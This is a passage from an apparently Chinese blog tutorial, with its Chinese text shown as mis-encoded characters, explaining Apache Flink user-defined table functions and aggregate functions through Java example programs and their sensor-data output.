‡é‡å€¼ä½œä¸ºè¾“å…¥å‚æ•°ï¼›<strong>ä¸æ ‡é‡å‡½æ•°ä¸åŒçš„æ˜¯ï¼Œå®ƒå¯ä»¥è¿”å›ä»»æ„æ•°é‡çš„è¡Œä½œä¸ºè¾“å‡ºï¼Œè€Œä¸æ˜¯å•ä¸ªå€¼</strong> </li><li> ä¸ºäº†å®šä¹‰ä¸€ä¸ªè¡¨å‡½æ•°ï¼Œå¿…é¡»æ‰©å±• org.apache.flink.table.functions ä¸­çš„åŸºç±» TableFunction å¹¶å®ç°ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰æ±‚å€¼æ–¹æ³• </li><li> <strong>è¡¨å‡½æ•°çš„è¡Œä¸ºç”±å…¶æ±‚å€¼æ–¹æ³•å†³å®šï¼Œæ±‚å€¼æ–¹æ³•å¿…é¡»æ˜¯ public çš„ï¼Œå¹¶å‘½åä¸º eval</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Split</span> <span class="keyword">extends</span> <span class="title">TableFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®šä¹‰å±æ€§ï¼Œåˆ†éš”ç¬¦</span></span><br><span class="line">  <span class="keyword">private</span> String separator = <span class="string">&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Split</span><span class="params">(String separator)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.separator = separator;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eval</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String s : str.split(separator)) &#123;</span><br><span class="line">      collect(<span class="keyword">new</span> Tuple2&lt;&gt;(s, s.length()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="æµ‹è¯•ä»£ç -12"><a href="#æµ‹è¯•ä»£ç -12" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.TableFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 3:58 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest2_TableFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºTableæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°†æµè½¬æ¢ä¸ºè¡¨</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id,timestamp as ts,temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è‡ªå®šä¹‰è¡¨å‡½æ•°ï¼Œå®ç°å°†idæ‹†åˆ†ï¼Œå¹¶è¾“å‡ºï¼ˆword, lengthï¼‰</span></span><br><span class="line">    Split split = <span class="keyword">new</span> Split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="comment">// éœ€è¦åœ¨ç¯å¢ƒä¸­æ³¨å†ŒUDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;split&quot;</span>, split);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    Table resultTable = sensorTable</span><br><span class="line">      .joinLateral(<span class="string">&quot;split(id) as (word, length)&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, ts, word, length&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, ts, word, length &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; from sensor, lateral table(split(id)) as splitid(word, length)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰ Table Function</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Split</span> <span class="keyword">extends</span> <span class="title">TableFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼Œåˆ†éš”ç¬¦</span></span><br><span class="line">    <span class="keyword">private</span> String separator = <span class="string">&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Split</span><span class="params">(String separator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.separator = separator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eval</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (String s : str.split(separator)) &#123;</span><br><span class="line">        collect(<span class="keyword">new</span> Tuple2&lt;&gt;(s, s.length()));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718199,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718199,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718199,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718199,1,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,1547718201,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,1547718201,6,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_6,1547718201,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_6,1547718201,6,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,1547718202,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,1547718202,7,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_7,1547718202,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_7,1547718202,7,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,1547718205,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,1547718205,10,2</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_10,1547718205,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_10,1547718205,10,2</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718207,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718207,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718207,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718207,1,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718209,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718209,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718209,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718209,1,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718212,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718212,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718212,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718212,1,1</span></span><br></pre></td></tr></table></figure><h5 id="èšåˆå‡½æ•°-Aggregate-Functions"><a href="#èšåˆå‡½æ•°-Aggregate-Functions" class="headerlink" title="èšåˆå‡½æ•°(Aggregate Functions)"></a>èšåˆå‡½æ•°(Aggregate Functions)</h5><p><strong>èšåˆï¼Œå¤šå¯¹ä¸€ï¼Œç±»ä¼¼å‰é¢çš„çª—å£èšåˆ</strong></p><hr><ul><li>ç”¨æˆ·è‡ªå®šä¹‰èšåˆå‡½æ•°ï¼ˆUser-Defined Aggregate Functionsï¼ŒUDAGGsï¼‰å¯ä»¥æŠŠä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œèšåˆæˆä¸€ä¸ªæ ‡é‡å€¼</li><li>ç”¨æˆ·å®šä¹‰çš„èšåˆå‡½æ•°ï¼Œæ˜¯é€šè¿‡ç»§æ‰¿ AggregateFunction æŠ½è±¡ç±»å®ç°çš„</li></ul><p><img src="https://img-blog.csdnimg.cn/20200601221643915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=JJ5Ld&originHeight=335&originWidth=635&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>AggregationFunctionè¦æ±‚å¿…é¡»å®ç°çš„æ–¹æ³• <ul><li><code>createAccumulator()</code></li><li><code>accumulate()</code></li><li><code>getValue()</code></li></ul></li><li>AggregateFunction çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š <ul><li>é¦–å…ˆï¼Œå®ƒéœ€è¦ä¸€ä¸ªç´¯åŠ å™¨ï¼ˆAccumulatorï¼‰ï¼Œç”¨æ¥ä¿å­˜èšåˆä¸­é—´ç»“æœçš„æ•°æ®ç»“æ„ï¼›å¯ä»¥é€šè¿‡è°ƒç”¨ <code>createAccumulator()</code> æ–¹æ³•åˆ›å»ºç©ºç´¯åŠ å™¨</li><li>éšåï¼Œå¯¹æ¯ä¸ªè¾“å…¥è¡Œè°ƒç”¨å‡½æ•°çš„ <code>accumulate()</code> æ–¹æ³•æ¥æ›´æ–°ç´¯åŠ å™¨</li><li>å¤„ç†å®Œæ‰€æœ‰è¡Œåï¼Œå°†è°ƒç”¨å‡½æ•°çš„ <code>getValue()</code> æ–¹æ³•æ¥è®¡ç®—å¹¶è¿”å›æœ€ç»ˆç»“æœ</li></ul></li></ul><h6 id="æµ‹è¯•ä»£ç -13"><a href="#æµ‹è¯•ä»£ç -13" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 4:24 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest3_AggregateFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°†æµè½¬æ¢æˆè¡¨</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è‡ªå®šä¹‰èšåˆå‡½æ•°ï¼Œæ±‚å½“å‰ä¼ æ„Ÿå™¨çš„å¹³å‡æ¸©åº¦å€¼</span></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    AvgTemp avgTemp = <span class="keyword">new</span> AvgTemp();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éœ€è¦åœ¨ç¯å¢ƒä¸­æ³¨å†ŒUDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;avgTemp&quot;</span>, avgTemp);</span><br><span class="line">    Table resultTable = sensorTable</span><br><span class="line">      .groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .aggregate(<span class="string">&quot;avgTemp(temp) as avgtemp&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, avgtemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, avgTemp(temp) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; from sensor group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">    tableEnv.toRetractStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„AggregateFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AvgTemp</span> <span class="keyword">extends</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Double</span>, <span class="title">Tuple2</span>&lt;<span class="title">Double</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getValue</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator.f0 / accumulator.f1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="number">0.0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¿…é¡»å®ç°ä¸€ä¸ªaccumulateæ–¹æ³•ï¼Œæ¥æ•°æ®ä¹‹åæ›´æ–°çŠ¶æ€</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œæ–¹æ³•åå¿…é¡»æ˜¯è¿™ä¸ªï¼Œä¸”å¿…é¡»publicã€‚</span></span><br><span class="line">    <span class="comment">// ç´¯åŠ å™¨å‚æ•°ï¼Œå¿…é¡»å¾—æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼›éšåçš„æ‰æ˜¯æˆ‘ä»¬è‡ªå·±ä¼ çš„å…¥å‚</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accumulate</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator, Double temp)</span> </span>&#123;</span><br><span class="line">      accumulator.f0 += temp;</span><br><span class="line">      accumulator.f1 += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.5)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.5)</span></span><br></pre></td></tr></table></figure><h5 id="è¡¨èšåˆå‡½æ•°"><a href="#è¡¨èšåˆå‡½æ•°" class="headerlink" title="è¡¨èšåˆå‡½æ•°"></a>è¡¨èšåˆå‡½æ•°</h5><ul><li>ç”¨æˆ·å®šä¹‰çš„è¡¨èšåˆå‡½æ•°ï¼ˆUser-Defined Table Aggregate Functionsï¼ŒUDTAGGsï¼‰ï¼Œå¯ä»¥æŠŠä¸€ä¸ªè¡¨ä¸­æ•°æ®ï¼Œèšåˆä¸ºå…·æœ‰å¤šè¡Œå’Œå¤šåˆ—çš„ç»“æœè¡¨</li><li>ç”¨æˆ·å®šä¹‰è¡¨èšåˆå‡½æ•°ï¼Œæ˜¯é€šè¿‡ç»§æ‰¿ TableAggregateFunction æŠ½è±¡ç±»æ¥å®ç°çš„</li></ul><p><img src="https://img-blog.csdnimg.cn/20200601223517314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wte81&originHeight=325&originWidth=635&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>AggregationFunction è¦æ±‚å¿…é¡»å®ç°çš„æ–¹æ³•ï¼š <ul><li><code>createAccumulator()</code></li><li><code>accumulate()</code></li><li><code>emitValue()</code></li></ul></li><li>TableAggregateFunction çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š <ul><li>é¦–å…ˆï¼Œå®ƒåŒæ ·éœ€è¦ä¸€ä¸ªç´¯åŠ å™¨ï¼ˆAccumulatorï¼‰ï¼Œå®ƒæ˜¯ä¿å­˜èšåˆä¸­é—´ç»“æœçš„æ•°æ®ç»“æ„ã€‚é€šè¿‡è°ƒç”¨ <code>createAccumulator()</code> 